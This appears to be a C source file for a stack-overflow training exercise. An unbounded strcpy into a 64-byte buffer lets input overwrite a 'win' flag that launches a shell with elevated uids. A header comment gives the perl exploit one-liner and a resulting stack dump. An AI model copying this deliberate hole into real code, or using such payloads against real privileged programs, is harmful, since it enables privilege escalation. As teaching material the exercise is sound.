/*
** Solution
** ./simple_overwrite $( perl -e 'print "A"x80 . "\x00\x00\x00\x01" ' )
**
** Stack dump:
** 0xffffd5f8: 0x000015d1
** 0xffffd5f4: 0xffffd7e9 (second argument)
** 0xffffd5f0: 0x00000001 (first argument)
** 0xffffd5ec: 0x41414141 (saved eip)
** 0xffffd5e8: 0x41414141 (saved ebp)
** 0xffffd5e4: 0x41414141
** 0xffffd5e0: 0x41414141
** 0xffffd5dc: 0x41414141
** 0xffffd5d8: 0x41414141
** 0xffffd5d4: 0x41414141
** 0xffffd5d0: 0x41414141
** 0xffffd5cc: 0x41414141
** 0xffffd5c8: 0x41414141
** 0xffffd5c4: 0x41414141
** 0xffffd5c0: 0x41414141
** 0xffffd5bc: 0x41414141
** 0xffffd5b8: 0x41414141
** 0xffffd5b4: 0x41414141
** 0xffffd5b0: 0x41414141
** 0xffffd5ac: 0x41414141
** 0xffffd5a8: 0x41414141
** 0xffffd5a4: 0x41414141
** 0xffffd5a0: 0x41414141 (beginning of buffer)
** win = 1
** 
*/

void vuln(int win, char *str) {
    char buf[64];
    strcpy(buf, str);
    dump_stack((void **) buf, 23, (void **) &win);
    printf("win = %d\n", win);
    if (win == 1) {
        execl("/bin/sh", "sh", NULL);
    } else {
        printf("Sorry, you lose.\n");
    }
    exit(0);
}

int main(int argc, char **argv) {
    if (argc != 2) {
        printf("Usage: stack_overwrite [str]\n");
        return 1;
    }

    uid_t euid = geteuid();
    setresuid(euid, euid, euid);
    vuln(0, argv[1]);
    return 0;
}
